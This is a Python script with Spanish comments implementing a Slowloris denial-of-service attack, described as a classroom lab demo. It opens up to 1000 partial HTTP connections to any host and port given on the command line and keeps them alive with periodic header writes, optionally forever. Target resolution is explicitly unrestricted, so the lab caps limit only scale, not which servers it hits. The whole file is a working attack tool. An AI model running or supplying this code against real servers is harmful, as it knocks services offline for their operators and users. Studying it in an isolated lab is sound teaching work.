"""Slowloris: conexiones abiertas que nunca terminan la peticion.

Con `--forever` mantiene las conexiones indefinidamente, refrescando cabeceras
cada pocos segundos, hasta Ctrl+C. Sirve para mostrar en clase como un servidor
sin timeout de lectura acumula sockets con un ancho de banda minimo.
"""

import argparse
import json
import socket
import time

# Topes duros del laboratorio (por contenedor).
MAX_SOCKETS = 1000       # slowloris
MAX_DURATION = 86400     # segundos (24 h) cuando no es infinito


def parse_target(value: str, default_port: int | None = None) -> tuple[str, int]:
    """Acepta 'host', 'host:puerto' o 'esquema://host:puerto'."""
    raw = value.strip()
    if "://" in raw:
        from urllib.parse import urlparse

        parsed = urlparse(raw)
        host = parsed.hostname or ""
        port = parsed.port or default_port
    elif raw.count(":") == 1:
        host, _, raw_port = raw.partition(":")
        port = int(raw_port) if raw_port.isdigit() else default_port
    else:
        host, port = raw, default_port

    if not host:
        raise ValueError(f"destino invalido: '{value}'")
    if port is None:
        raise ValueError("falta el puerto: usa --port o 'host:puerto'")
    if not 1 <= port <= 65535:
        raise ValueError(f"puerto fuera de rango: {port}")
    return host, port


def resolve(host: str, port: int) -> str:
    """Resuelve `host` a una dirección IP utilizable, sin restricción de red."""
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise ValueError(f"no se pudo resolver '{host}': {exc}") from exc

    for info in infos:
        if info[4][0]:
            return info[4][0]
    raise ValueError(f"'{host}' no tiene direcciones utilizables")


def clamp(name: str, value: float, maximum: float) -> float:
    """Recorta un parámetro al tope duro e informa cuando lo hace."""
    if value <= 0:
        raise ValueError(f"{name} debe ser > 0 (recibido {value})")
    if value > maximum:
        print(f"[limite] {name}={value} excede el tope del lab, se usa {maximum}")
        return maximum
    return value


def open_partial(ip: str, port: int, host: str) -> socket.socket:
    """Abre una conexion y deja la peticion a medias (sin linea en blanco)."""
    sock = socket.create_connection((ip, port), timeout=3)
    sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
    sock.sendall(b"X-Padding: " + b"a" * 16 + b"\r\n")
    return sock


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Slowloris acotado (laboratorio)"
    )
    parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
    parser.add_argument("--port", type=int, required=True, help="puerto del destino")
    parser.add_argument("--sockets", type=int, default=200, help="conexiones parciales")
    parser.add_argument("--duration", type=float, default=30.0, help="segundos")
    parser.add_argument("--forever", action="store_true", help="no termina hasta Ctrl+C")
    parser.add_argument("--keepalive", type=float, default=5.0, help="segundos entre refrescos")
    args = parser.parse_args()

    try:
        host, port = parse_target(args.dns, args.port)
        ip = resolve(host, port)
    except ValueError as exc:
        print(f"[abortado] {exc}")
        raise SystemExit(2)

    sockets_wanted = int(clamp("sockets", args.sockets, MAX_SOCKETS))
    if not args.forever:
        args.duration = clamp("duration", args.duration, MAX_DURATION)

    print("=" * 66)
    print(f"  DESTINO   : {host}:{port}  ->  {ip}")
    print(f"  PATRON    : {sockets_wanted} sockets con cabeceras incompletas")
    print(f"  MODO      : {'INFINITO (Ctrl+C para parar)' if args.forever else f'{args.duration:g}s'}")
    print("=" * 66, flush=True)

    sockets: list[socket.socket] = []
    failures = 0
    for index in range(sockets_wanted):
        try:
            sockets.append(open_partial(ip, port, host))
        except OSError:
            failures += 1
            if not sockets:
                print("  el destino no acepta conexiones")
                raise SystemExit(1)
        if index and index % 50 == 0:
            print(f"  {len(sockets)} conexiones parciales abiertas", flush=True)

    opened = len(sockets)
    print(f"  abiertas {opened} conexiones · fallidas {failures}", flush=True)

    deadline = None if args.forever else time.perf_counter() + args.duration
    closed_by_peer = 0
    try:
        while sockets and (deadline is None or time.perf_counter() < deadline):
            alive: list[socket.socket] = []
            for sock in sockets:
                try:
                    sock.sendall(b"X-Keepalive: 1\r\n")
                    alive.append(sock)
                except OSError:
                    sock.close()
            gone = len(sockets) - len(alive)
            if gone:
                closed_by_peer += gone
                print(f"  el destino cerro {gone} conexiones", flush=True)
            sockets = alive
            time.sleep(args.keepalive)
    except KeyboardInterrupt:
        print("\n  detenido por el usuario")
    finally:
        for sock in sockets:
            try:
                sock.close()
            except OSError:
                pass
        print(f"  resumen: {opened} abiertas · {closed_by_peer} cerradas por el destino", flush=True)
        print(
            "RESULT:"
            + json.dumps(
                {
                    "kind": "slowloris",
                    "opened": opened,
                    "closed_by_peer": closed_by_peer,
                    "connect_failures": failures,
                },
                sort_keys=True,
            ),
            flush=True,
        )


if __name__ == "__main__":
    main()
